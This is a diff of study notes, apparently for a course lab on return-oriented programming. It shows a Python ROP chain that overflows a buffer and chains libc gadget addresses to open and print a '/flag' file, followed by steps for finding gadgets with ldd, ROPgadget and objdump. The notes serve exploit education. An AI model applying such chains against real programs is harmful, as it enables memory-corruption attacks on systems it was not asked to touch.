@@ -42,7 +42,7 @@ OPEN THE FLAG and print value> [!PDF|] [[L13 Return-oriented Programming.pdf#pag
 # .date 0x0000000000404030 p = ''
 
 p += "A"*56  
-p += pack('<Q', 0x00007ffff7de6b72) # pop rdi ; ret  
+p += pack('<Q', 0x00007ffff7decb6a) # pop rdi ; ret  
 p += pack('<Q', 0x0000000000404030) # @ .data  
 p += pack('<Q', 0x00007ffff7e0a550) # pop rax ; ret  
 p += '/flag'  
@@ -62,18 +62,6 @@ p += pack('<Q', 0x00007ffff7e0a550) # pop rax ; ret
 p += pack('<Q', 0x000000000000003c) # 60  
 p += pack('<Q', 0x00007ffff7de584d) # syscall  
 print p
-
-|   |
-|---|
-|1|
-|0|
-|Addr of “pop rdx; pop r12; ret”|
-|1|
-|Addr of “pop rdi; ret”|
-|Addr of “mov rsi, rax ; shr ecx, 3 ; rep movsq qword ptr [rdi], qword ptr [rsi] ; ret”|
-|... many bytes ...|
-||
-||
 ```
 
 1. ldd로 확인
@@ -91,3 +79,4 @@ python3 ROPgadget/ROPgadget.py --binary /lib/x86_64-linux-gnu/libc.so.6
 
 
 ```
+3. objdump로 메모리 주소 확인하기
